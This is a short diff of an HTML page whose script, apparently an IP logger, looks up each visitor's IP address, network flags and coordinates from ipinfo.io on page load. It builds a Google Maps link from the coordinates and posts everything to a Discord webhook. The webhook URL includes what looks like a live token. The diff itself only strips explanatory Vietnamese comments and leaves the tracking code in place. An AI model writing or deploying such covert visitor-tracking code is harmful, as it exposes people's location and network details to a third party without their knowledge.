@@ -12,7 +12,6 @@
         request.open("POST", "https://discord.com/api/webhooks/1557733822601105419/3P02RcN4TR9j8DkIq8GodlkvgBo2bD-40J_5NaFNle3KvxeTtKoNhRbQGELIy7o_9jr6");
         request.setRequestHeader('Content-type', 'application/json');
 
-        // Kiểm tra xem ipinfo có trả về cờ privacy (VPN/Proxy/Hosting) không
         let isVpnOrProxy = "NO";
         if (json.privacy) {
             if (json.privacy.vpn || json.privacy.proxy || json.privacy.hosting) {
@@ -20,7 +19,6 @@
             }
         }
 
-        // Tạo link Google Maps từ tọa độ loc (ví dụ: "21.0285,105.8542")
         let lat = 'N/A', lon = 'N/A', mapsLink = 'Không có tọa độ';
         if (json.loc) {
             let coords = json.loc.split(',');
@@ -83,8 +81,6 @@
         request.send(JSON.stringify(params));
     }
     </script>
-
-    <!-- Lấy dữ liệu IP và thông tin mạng chi tiết từ ipinfo -->
     <script src="https://ipinfo.io/json?callback=monke"></script>
 </body>
 </html>
